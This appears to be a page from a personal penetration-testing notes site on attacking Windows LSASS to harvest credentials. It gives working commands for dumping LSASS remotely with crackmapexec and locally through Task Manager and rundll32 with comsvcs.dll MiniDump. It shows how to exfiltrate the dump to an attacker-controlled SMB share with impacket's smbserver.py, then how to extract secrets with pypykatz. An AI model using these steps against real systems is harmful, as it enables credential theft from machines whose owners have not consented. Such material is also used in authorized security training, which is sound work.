---
title: Attacking LSASS
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
---
# Attacking LSASS 

 LSASS stores credentials that have active logon sessions on Windows systems.  When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time.
 
## Dumping LSASS remotely

```bash
crackmapexec smb $ip --local-auth -u <username> -p <password> --lsa
```

## Dumping LSASS Locally

### Task Manager Method

The Task Manager method is dependent on us having a GUI-based interactive session with a target.

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`

A file called `lsass.DMP` is created and saved in:

  Attacking LSASS

```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```

This is the file we will transfer to our attack host.  For instance, with [smbserver.py from impacket](smbserver.md).

```bash
# From the attacker machine (our kali) all we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the direct
#########################################
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

# From the victim's machine (windows)
#########################################
move C:\Users\loggedonusersdirectory\AppData\Local\Temp\lsass.DMP  \\$ipAttacker\CompData
```

### Rundll32.exe & Comsvcs.dll Method

We can use an alternative method to dump LSASS process memory through a command-line utility called [rundll32.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32).

Modern anti-virus tools recognize this method as malicious activity.

```powershell
# Finding LSASS PID in cmd
tasklist /svc

# Finding LSASS PID in PowerShell
Get-Process lsass

# Creating lsass.dmp using an elevated PowerShell session
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
# With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp). 
```

Transfer file to attacking machine.

For instance, with [smbserver.py from impacket](smbserver.md).

```bash
# From the attacker machine (our kali) all we must do to create the share is run smbserver.py -smb2support using python, give the share a name (CompData) and specify the direct
#########################################
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/

# From the victim's machine (windows)
#########################################
# If you are from powershell
cmd.exe /c move C:\lsass.dmp
# If you have a cmd terminal
move C:\lsass.dmp  \\$ipAttacker\CompData
```



## Crack the lsass file withPypykatz

[pypykatz](pypykatz.md) parses the secrets hidden in the LSASS process memory dump.

```bash
pypykatz lsa minidump /home/path/lsass.dmp 
```

